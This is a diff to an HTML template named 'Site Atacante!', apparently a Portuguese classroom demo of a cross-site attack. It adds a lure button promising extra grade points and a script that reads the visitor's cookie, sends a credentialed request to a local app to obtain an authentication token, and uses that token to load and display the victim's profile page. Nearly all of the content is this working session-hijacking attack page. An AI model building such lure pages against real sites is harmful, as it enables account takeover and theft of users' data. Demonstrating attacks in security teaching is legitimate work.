@@ -4,23 +4,36 @@
 		<meta charset = "UTF-8">
 		<meta http-equiv = "X-UA-Compatible" content = "IE = edge">
 		<meta name = "viewport" content = "width = device-width, initial-scale = 1.0">
-		
+		<link rel="stylesheet" href="{{url_for('static', filename='css/site_atacante.css')}}" type="text/css"/>
 		<title>Site Atacante!</title>
-
-		<link rel = "stylesheet" href = "{{url_for('static', filename='CSS/site_atacante.css')}}" type = "text/css"/>
 	</head>
-	<body>
-		<button id = "myButton">Clique aqui!</button>
+		<button id = "myButton">Clique aqui para ganhar 2 pontos na média em Redes!</button>
 		<script>
 			async function sendRequest() {
-				const response = await fetch("http://localhsost:5000/login");
-
-				console.log(response);
+				const cookie = document.cookie.split("=")[1];
+				console.log(cookie);
+				let response = await fetch("http://127.0.0.1:5000/login?include_auth_token", {
+					method: "GET",
+					credentials: "include",
+					headers: {
+						"Content-Type": "application/json",
+						"Cookie": `session=${cookie}`
+					}
+				});
 
 				window.alert("Você foi hackeado!");
+
+				const result = await response.json();
+
+				const token = result.response.user.authentication_token;
+
+				response = await fetch(`http://127.0.0.1:5000/profile?auth_token=${token}`);
+
+				document.querySelector("body").innerHTML = await response.text();
 			}
 
 			document.getElementById("myButton").addEventListener("click", sendRequest);
 		</script>
+		<p>Por coach Daniel Batista</p>
 	</body>
 </html>
